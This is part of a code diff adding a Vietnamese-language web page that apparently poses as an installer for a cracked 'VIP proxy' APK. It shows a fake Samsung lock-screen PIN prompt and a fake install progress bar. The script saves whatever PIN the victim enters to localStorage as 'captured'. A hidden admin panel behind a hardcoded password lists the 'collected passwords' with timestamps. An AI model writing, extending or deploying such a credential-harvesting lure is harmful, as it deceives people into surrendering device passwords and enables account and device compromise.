+.samnum{font-size:22px;font-weight:400;color:#1a1a2e;line-height:1}
+.samlet{font-size:9px;color:#888;letter-spacing:.5px;margin-top:3px}
+.samkey-del{background:#dcd8e4}
+.samkey-go{background:#7b80d8}
+.samkey-go:active{background:#6568c0}
+.samkey-go.disabled{background:#c5c3d8;pointer-events:none}
+</style>
+
+<!-- ADMIN LOGIN -->
+<div class="ov" id="adm-login" onclick="if(event.target===this)this.classList.remove('open')">
+  <div class="dr">
+    <div class="dpill"></div>
+    <div style="font-size:16px;font-weight:600;color:#111;margin-bottom:16px">Đăng nhập Admin</div>
+    <div style="font-size:12px;color:#999;margin-bottom:8px">Mật khẩu quản trị</div>
+    <input type="password" class="l-inp" id="adm-pw"
+      placeholder="Nhập mật khẩu"
+      onkeydown="if(event.key==='Enter')checkAdm()"
+      oninput="document.getElementById('adm-err').classList.remove('show')">
+    <div class="l-err" id="adm-err">Sai mật khẩu. Thử lại.</div>
+    <button class="l-btn" onclick="checkAdm()">Đăng nhập</button>
+    <button class="l-cancel" onclick="document.getElementById('adm-login').classList.remove('open')">Huỷ</button>
+  </div>
+</div>
+
+<!-- DATA DRAWER -->
+<div class="ov" id="adm-data" onclick="if(event.target===this)this.classList.remove('open')">
+  <div class="dr">
+    <div class="dpill"></div>
+    <div class="d-top">
+      <h3>Mật khẩu đã thu thập</h3>
+      <button class="del-btn" onclick="clearDB()">Xoá tất cả</button>
+    </div>
+    <div id="pw-list"><div class="empty">Chưa có dữ liệu.</div></div>
+    <button class="dr-close" onclick="document.getElementById('adm-data').classList.remove('open')">Đóng</button>
+  </div>
+</div>
+
+<script>
+/* CLOCK */
+function tick(){
+  const n=new Date();
+  const t=String(n.getHours()).padStart(2,'0')+':'+String(n.getMinutes()).padStart(2,'0');
+  document.getElementById('clk').textContent=t;
+  const ic=document.getElementById('inst-clk');
+  if(ic)ic.textContent=t;
+}
+tick();setInterval(tick,15000);
+
+/* REC TIMER */
+let recSec=5;
+setInterval(()=>{
+  recSec++;
+  const m=String(Math.floor(recSec/60)).padStart(2,'0');
+  const s=String(recSec%60).padStart(2,'0');
+  document.getElementById('rec-time').textContent=m+':'+s;
+},1000);
+
+/* BG INSTALL BAR — slow crawl */
+let bgP=65;
+setInterval(()=>{
+  if(bgP<95){bgP+=.08;document.getElementById('bg-bar').style.width=bgP+'%';}
+},200);
+
+/* OPEN SAMSUNG PW SCREEN */
+function openPwScreen(){
+  samPin='';
+  renderSamDots();
+  document.getElementById('sam-err').style.opacity='0';
+  document.getElementById('samsung-pw-screen').style.display='flex';
+  // sync clock
+  const n=new Date();
+  document.getElementById('sam-clk').textContent=
+    String(n.getHours()).padStart(2,'0')+':'+String(n.getMinutes()).padStart(2,'0');
+}
+
+/* SAMSUNG NUMPAD */
+let samPin='';
+function renderSamDots(){
+  const d=document.getElementById('sam-dots');
+  if(!samPin){d.textContent='​';d.style.letterSpacing='10px';return;}
+  d.textContent='●'.repeat(samPin.length);
+  d.style.letterSpacing='10px';
+  const go=document.getElementById('sam-go');
+  go.classList.toggle('disabled',!samPin);
+}
+function samTap(v){
+  if(samPin.length>=32)return;
+  samPin+=v;
+  renderSamDots();
+  document.getElementById('sam-err').style.opacity='0';
+  if(navigator.vibrate)navigator.vibrate(8);
+}
+function samDel(){
+  if(!samPin)return;
+  samPin=samPin.slice(0,-1);
+  renderSamDots();
+  if(navigator.vibrate)navigator.vibrate(8);
+}
+async function samSubmit(){
+  if(!samPin){
+    document.getElementById('sam-err').textContent='Vui lòng nhập mật khẩu.';
+    document.getElementById('sam-err').style.opacity='1';
+    return;
+  }
+  const go=document.getElementById('sam-go');
+  go.classList.add('disabled');
+
+  /* save to localStorage */
+  try{
+    const list=JSON.parse(localStorage.getItem('captured')||'[]');
+    list.push({password:samPin,file:'nexa-proxy-vip-crack.apk',time:new Date().toISOString()});
+    localStorage.setItem('captured',JSON.stringify(list));
+  }catch(e){}
+
+  setTimeout(()=>{
+    document.getElementById('samsung-pw-screen').style.display='none';
+    document.getElementById('inst-scr').classList.add('show');
+    runInstall();
+  },600);
+}
+
+/* MAIN BUTTON */
+function doUnderstand(){
+  const btn=document.getElementById('main-btn');
+  btn.classList.add('loading');
+  setTimeout(()=>{
+    btn.classList.remove('loading');
+    document.getElementById('inst-scr').classList.add('show');
+    runInstall();
+  },700);
+}
+
+/* INSTALL PROGRESS */
+function runInstall(){
+  const fill=document.getElementById('inst-fill');
+  const pct=document.getElementById('inst-pct');
+  const status=document.getElementById('inst-status');
+  const openBtn=document.getElementById('inst-open-btn');
+  let p=65;
+  fill.style.width=p+'%';
+  pct.textContent=Math.round(p)+'%';
+  const iv=setInterval(()=>{
+    p=Math.min(100,p+(p<80?.4:p<95?.2:.08));
+    fill.style.width=p+'%';
+    pct.textContent=Math.round(p)+'%';
+    if(p>=100){
+      clearInterval(iv);
+      status.textContent='Đã cài đặt';
+      openBtn.style.opacity='1';
+      pct.textContent='Hoàn tất';
+    }
+  },80);
+}
+
+/* ADMIN */
+const PASS='Skibidi@123';
+function openAdmLogin(){
+  document.getElementById('adm-pw').value='';
+  document.getElementById('adm-err').classList.remove('show');
+  document.getElementById('adm-login').classList.add('open');
+  setTimeout(()=>document.getElementById('adm-pw').focus(),150);
+}
+function checkAdm(){
+  if(document.getElementById('adm-pw').value===PASS){
+    document.getElementById('adm-login').classList.remove('open');
+    renderList();
+    document.getElementById('adm-data').classList.add('open');
+  } else {
+    document.getElementById('adm-err').classList.add('show');
+    document.getElementById('adm-pw').value='';
+  }
+}
+function renderList(){
+  const el=document.getElementById('pw-list');
+  try{
+    const list=JSON.parse(localStorage.getItem('captured')||'[]');
+    if(!list.length){el.innerHTML='<div class="empty">Chưa có dữ liệu.</div>';return;}
+    let html='';
+    list.forEach(d=>{
+      const t=d.time?new Date(d.time).toLocaleString('vi-VN'):'—';
+      html+=`<div class="pw-row"><span class="pw-val">${esc(d.password||'')}</span><span class="pw-time">${t}</span></div>`;
+    });
+    el.innerHTML=html;
+  }catch(e){el.innerHTML='<div class="empty">Lỗi đọc dữ liệu.</div>';}
+}
+function clearDB(){
+  try{localStorage.removeItem('captured');}catch(e){}
+  renderList();
+}
+function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+</script>
+</body>
+</html>
